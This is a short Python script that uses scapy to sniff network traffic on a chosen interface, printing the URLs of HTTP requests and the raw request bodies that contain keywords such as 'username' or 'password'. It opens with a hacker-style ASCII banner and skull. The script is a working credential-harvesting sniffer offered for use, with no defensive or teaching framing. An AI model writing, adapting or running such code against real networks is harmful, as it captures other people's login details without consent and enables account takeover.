#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


print ("""
     ____    _   _      _      ____    ____    _   _   _   _  
    |  _ \  | | | |    / \    |  _ \  / ___|  | | | | | \ | | 
    | | | | | |_| |   / _ \   | |_) | \___ \  | | | | |  \| | 
    | |_| | |  _  |  / ___ \  |  _ <   ___) | | |_| | | |\  | 
    |____/  |_| |_| /_/   \_\ |_| \_\ |____/   \___/  |_| \_| 
    
    
    
                                  ______   
	                       .-        -. 
	                      /            \         
	                     |,  .-.  .-.  ,|      
	                     | )(_ /  \_ )( |
	                     |/     /\     \|    
	           (@_       <__    ^^    __>        
	      _     ) \_______\__|IIIIII|__/____________________/\ 
	     (_)\@8@8{}<_________________________________________/ 
	            )_/         \ IIIIII /                    
	           (@            --------                      
		  \n\n""")


def sniff():
    interface = input("ENTER INTERFACE TO SCAN == ")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[-] Got Some HTTP Requests [-]")
        print(url)
        print("-------------------------------------------------------------------------------------------------------")
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "Username", "user", "uname", "User", "Password", "Pass", "pass", "Pass"]
            for keyword in keywords:
                if keyword in str(load):
                    print("[+] Got Some PASSCODES [+]")
                    print(load)
                    print("-------------------------------------------------------------------------------------------------------")

                    break


sniff()